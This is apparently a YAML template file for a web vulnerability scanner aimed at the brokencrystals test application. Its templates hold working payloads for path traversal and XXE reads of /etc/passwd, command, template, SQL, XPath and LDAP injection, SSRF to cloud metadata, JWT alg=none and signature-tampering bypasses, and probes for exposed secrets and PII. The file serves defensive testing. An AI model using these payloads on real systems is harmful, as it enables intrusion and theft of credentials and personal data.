# Active vulnerability templates, data not code. Each is one request plus a
# matcher; the engine sends it and reports a finding when the matcher fires.
# These are confirmed against the brokencrystals test target. Keep them safe:
# read-only or benign payloads, no destructive verbs (no DELETE), no real email.
#
# request: method / path / body / content_type / follow_redirects
# match (all present conditions must hold): status, body_contains (str|list),
#   body_not_contains, body_regex, header_contains {name, value}

- id: lfi-path-traversal
  severity: high
  title: Local file inclusion / path traversal (reads /etc/passwd)
  request:
    method: GET
    path: "/api/file?path=/etc/passwd&type=text/plain"
  match:
    status: 200
    body_contains: "root:x:0:0"

- id: os-command-injection
  severity: critical
  title: OS command injection (command output reflected)
  request:
    method: GET
    path: "/api/spawn?command=echo%20opfor7f3a9"
  match:
    body_contains: "opfor7f3a9"

- id: ssti-dot
  severity: critical
  title: Server-side template injection (doT, 7*7 evaluated)
  request:
    method: POST
    path: "/api/render"
    body: "opfor{{= 7*7 }}sentinel"
    content_type: "text/plain"
  match:
    body_contains: "opfor49sentinel"

- id: sql-injection-error
  severity: high
  title: SQL injection (error-based, query reflected into SQL)
  request:
    method: GET
    path: "/api/testimonials/count?query=%27%20OR%20%271%27%3D%271"
  match:
    body_contains: "syntax error"

- id: open-redirect
  severity: medium
  title: Open redirect to attacker-controlled URL
  request:
    method: GET
    path: "/api/goto?url=https://opfor.example/"
    follow_redirects: false
  match:
    status: 302
    header_contains:
      name: Location
      value: "opfor.example"

- id: exposed-secrets
  severity: high
  title: Server secrets endpoint exposed
  request:
    method: GET
    path: "/api/secrets"
  match:
    status: 200
    body_regex: "(?i)(token|secret|api[_-]?key)"

- id: config-disclosure
  severity: high
  title: Server configuration with credentials disclosed
  request:
    method: GET
    path: "/api/config"
  match:
    status: 200
    body_contains: "postgres://"

- id: xxe-metadata
  severity: critical
  title: XML external entity (XXE) reads /etc/passwd
  request:
    method: POST
    path: "/api/metadata"
    content_type: "application/xml"
    body: '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>'
  match:
    body_contains: "root:x:0:0"

- id: xpath-injection
  severity: high
  title: XPath injection (raw XPath returns all records)
  request:
    method: GET
    path: "/api/partners/query?xpath=//%2A"
  match:
    status: 200
    body_contains: "<partner>"

- id: ldap-injection
  severity: medium
  title: LDAP injection point (backend error disclosed)
  request:
    method: GET
    path: "/api/users/ldap?query=%2A"
  match:
    body_regex: "(?i)(LDAP: error|NamingException)"

- id: unauth-pii-exposure
  severity: critical
  title: Unauthenticated access to user PII including card numbers
  request:
    method: GET
    path: "/api/users/search/a"
  match:
    status: 200
    body_contains: "cardNumber"

# A multi-step JWT attack: log in, tamper the token's signature, replay it
# against a validate endpoint that does not verify the signature.
- id: jwt-signature-not-verified
  type: jwt
  severity: critical
  title: JWT signature not verified (auth bypass, server secret disclosed)
  login:
    path: "/api/auth/jwt/weak-key/login"
    body: {user: admin, password: admin, op: basic}
    token_field: token
  attack: tamper_signature
  validate:
    path: "/api/auth/jwt/rsa/signature/validate"
  match:
    status: 200
    body_contains: "secret"

- id: jwt-alg-none
  type: jwt
  severity: critical
  title: JWT alg=none accepted (auth bypass via none algorithm)
  login:
    path: "/api/auth/jwt/weak-key/login"
    body: {user: admin, password: admin, op: basic}
    token_field: token
  attack: alg_none
  validate:
    path: "/api/auth/jwt/hmac/validate"
  match:
    status: 200
    body_contains: "secret"

- id: ssrf-cloud-metadata
  severity: critical
  title: SSRF reaches cloud metadata service (169.254.169.254)
  request:
    method: GET
    path: "/api/file/aws?path=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
  match:
    status: 200
    body_contains: "ami-id"

- id: lfi-file-raw
  severity: high
  title: Local file inclusion via /api/file/raw (reads /etc/passwd)
  request:
    method: GET
    path: "/api/file/raw?path=/etc/passwd"
  match:
    status: 200
    body_contains: "root:x:0:0"

- id: oidc-secret-exposure
  severity: high
  title: OIDC client secret exposed without authentication
  request:
    method: GET
    path: "/api/auth/oidc-client"
  match:
    status: 200
    body_contains: "clientSecret"

- id: unauth-userinfo
  severity: medium
  title: Unauthenticated access to user info (broken object level auth)
  request:
    method: GET
    path: "/api/v1/userinfo/admin"
  match:
    status: 200
    body_contains: "firstName"
